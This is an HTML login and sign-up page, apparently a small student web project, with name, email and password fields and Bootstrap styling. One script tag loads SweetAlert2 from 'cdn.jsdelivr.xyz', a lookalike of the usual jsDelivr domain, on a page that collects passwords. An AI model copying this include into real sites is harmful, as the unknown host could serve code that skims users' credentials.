<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="header m-auto mt-5 bg">
    <div class="py-4">
    <h1 class="text-center h1-cstm py-3">Smart Login System</h1>
    <form>
        <input type="text" class="form-control bg-transparent text-white w-75 m-auto input-name-cstm" id="nameInput" placeholder="Enter your Name">
        <input class="form-control bg-transparent text-white w-75 m-auto mt-3 " type="email" id="EmailInput" placeholder="Enter your email" >
        <input class="form-control mt-3 bg-transparent text-white w-75 m-auto" type="password" id="PasswordInput" placeholder="Enter your password">
        <p class="text-center text-danger" id="warning"></p>
    </form>
    <div class="button text-center">
    <button id="login-button" class="btn btn-outline-info mt-4 w-75">Login</button>
    <p id="creation-message" class="text-danger"></p>
    <button id="create-button" class="btn btn-outline-info mt-4 mb-5 w-75">Create Account</button>
    <p class="text-white text-center mt-5 p-cstm">Do you have an account ? <a href="#" id="signup">sign up</a> <a href="#" id="signin">sign in</a></p> 
    </div>
</div>
</div>
    <script src="JS/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.xyz/npm/sweetalert2@11"></script>
    <script src="JS/main.JS"></script>

</body>
</html>
